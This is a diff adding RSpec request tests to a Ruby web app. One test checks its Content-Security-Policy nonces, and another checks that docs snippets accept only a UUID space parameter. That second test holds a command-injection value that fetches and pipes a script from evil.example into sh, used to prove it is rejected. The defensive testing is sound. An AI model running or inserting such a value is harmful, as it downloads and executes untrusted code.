@@ -93,6 +93,34 @@ RSpec.describe 'Web UI' do
     end
   end
 
+  describe 'the content security policy' do
+    it 'allows scripts only from the server and with the nonce of the request, and every script tag carries it' do
+      get "/s/#{create_space.uuid}"
+
+      nonce = response.headers['Content-Security-Policy'][/script-src 'self' 'nonce-([^']+)'/, 1]
+      expect(nonce).to be_present
+      expect(response.headers['Content-Security-Policy']).to include("object-src 'none'", "frame-ancestors 'self'")
+
+      scripts = response.body.scan(/<script[^>]*>/)
+      expect(scripts).not_to be_empty
+      expect(scripts).to all(include(%(nonce="#{nonce}")).or(include('type="application/json"')))
+      expect(response.body).to include(%(<meta name="csp-nonce" content="#{nonce}"))
+    end
+  end
+
+  describe 'GET /docs/:section?space=' do
+    it 'fills the snippets with the space only when the parameter is a uuid' do
+      uuid = SecureRandom.uuid
+
+      get '/docs/cli', params: { space: uuid }
+      expect(response.body).to include("progresswatch space use #{uuid}")
+
+      get '/docs/cli', params: { space: "x\n$(curl evil.example | sh)" }
+      expect(response.body).not_to include('curl evil.example')
+      expect(response.body).to include('progresswatch space new')
+    end
+  end
+
   describe 'self-hosted, which is the default' do
     it 'never names the flag in anything written for a reader' do
       pages = Dir['app/views/docs/*.erb'] + ['README.md']
